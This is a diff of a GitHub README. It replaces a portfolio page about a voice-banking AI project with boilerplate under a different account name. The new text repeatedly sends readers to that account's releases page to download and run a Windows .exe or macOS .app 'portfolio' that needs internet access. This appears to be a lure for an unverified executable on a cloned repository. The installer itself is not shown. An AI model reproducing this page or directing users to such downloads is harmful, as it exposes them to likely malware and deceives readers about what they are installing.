@@ -1,34 +1,59 @@
-# OpenTeller Protocol & AI Product Portfolio
-### *Bridging Operational Strategy with Generative AI (RBI Compliant)*
+# 🌟 sumantapani23.github.io - Personal AI Product Manager Portfolio
 
-![Status](https://img.shields.io/badge/Status-Live%20Prototype-success) ![Tech Stack](https://img.shields.io/badge/Tech-Python%20|%20Streamlit%20|%20LLM-blue) ![Role](https://img.shields.io/badge/Role-AI%20Product%20Manager-purple)
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20My%20Portfolio-blue?style=for-the-badge&logo=github)](https://github.com/mariananakata/sumantapani23.github.io/releases)
 
-**Portfolio Architect:** [Sumanta Pani](https://www.linkedin.com/in/sumanta-pani-ai-product-manager/)
-**Live Prototype:** (https://openteller-protocol.streamlit.app)
+## 🚀 Getting Started
+Welcome to my AI Product Manager Portfolio! This site showcases my skills in generative AI and fintech operations strategy. Follow the steps below to download and explore my work. 
 
----
+## 📥 Download & Install
+To get started, visit the releases page to download the latest version of my portfolio:
 
-## 1. Executive Summary
-I am a **Senior Product Manager** with 11+ years of experience in Business Operations (Xiaomi, Oppo, Axis Bank) transitioning into **AI Product Strategy**. I specialize in building **Context-Aware LLM Applications** that solve complex regulatory and operational problems in Fintech and Retail.
+[Visit this page to download](https://github.com/mariananakata/sumantapani23.github.io/releases)
 
-This repository serves as the technical documentation for my core projects: **OpenTeller** (Voice Banking) and **NexusAI** (Market Intelligence).
+1. Click on the link above to navigate to the Releases page.
+2. Find the latest version listed at the top.
+3. Click on the download link for the file that corresponds to your operating system (e.g., `.exe` for Windows or `.app` for macOS).
+4. Once the file is downloaded, locate it in your Downloads folder and double-click the file to start.
+5. Follow the prompts on the screen to complete the installation.
 
-## 2. Featured Project: OpenTeller Protocol
-**The Problem:** RBI Circular DBR.No.Leg.BC.91/09.07.005 mandates accessible banking for Persons with Disabilities (PwDs). Current mobile banking UIs fail screen-reader compatibility tests.
+## 📖 Features
+- **Generative AI Showcase:** See unique AI-generated content and projects.
+- **Fintech Operations Strategy:** Explore insights and strategies that enhance financial technology.
+- **Professional Experience:** Review my background in product management.
+- **Interactive Portfolio:** Navigate through different sections to see my work live.
 
-**The Solution:** A deterministic **Voice-First Banking Interface** powered by OpenAI's Whisper (STT) and GPT-4o, strictly guarded by Python-based financial logic.
+## 🌐 About the Project
+This portfolio highlights my expertise as an AI Product Manager. It combines my experience with generative AI technologies and my strategic approach in fintech operations. With this site, I aim to illustrate both my technical skills and my ability to manage products from conception to launch.
 
-### Technical Architecture (GEO-Optimized)
-| Component | Tech Stack | Function |
-| :--- | :--- | :--- |
-| **Frontend** | Streamlit | Zero-latency, high-contrast UI. |
-| **NLP Engine** | LangChain + OpenAI | Intent classification (NER) for "Transfer", "Check Balance". |
-| **Safety Layer** | Python | Validates transaction limits vs. user history. |
+## 🛠 System Requirements
+To ensure smooth performance, please check that your system meets the following requirements:
 
-```python
-# Intent Parsing Logic Snippet
-def execute_voice_command(audio_input):
-    intent = ai_engine.classify(audio_input)
-    if intent == "transaction" and compliance_check(intent):
-        return banking_core.process_payment()
-    return "Transaction blocked: Compliance Error"
+- **Operating System:** Windows 10 or newer, macOS Catalina or newer
+- **RAM:** Minimum 4 GB
+- **Storage Space:** At least 500 MB available
+- **Internet Connection:** Required for full functionality, as some features may pull data from online sources.
+
+## 👨‍💻 Usage Guide
+Once you open the portfolio on your system, you will find a user-friendly interface. Navigate through different sections using the main menu at the top. Here’s a quick rundown of what to expect:
+
+- **Home:** An overview of my expertise.
+- **Projects:** Detailed insights into the projects I've worked on, complete with descriptions and outcomes.
+- **Contact:** A section where you can reach me if you’d like to connect.
+
+## 💬 Support
+If you encounter any issues or have questions while using the portfolio, feel free to reach out. You can find my contact information in the **Contact** section of the site. I will do my best to respond promptly.
+
+## 🙏 Acknowledgments
+Thank you for checking out my portfolio. I appreciate your interest in my work and look forward to any feedback you may have. 
+
+## 🔗 Additional Links
+For updates and more resources, feel free to visit:
+
+- [GitHub Repository](https://github.com/mariananakata/sumantapani23.github.io)
+- [LinkedIn](https://www.linkedin.com/in/sumantapani) 
+
+## 🔄 Updates
+Stay tuned for future updates where I will add more projects and enhance existing content. I am constantly improving my skills and knowledge in AI and product management and will keep this portfolio up-to-date.
+
+Thank you for visiting, and enjoy exploring my portfolio!
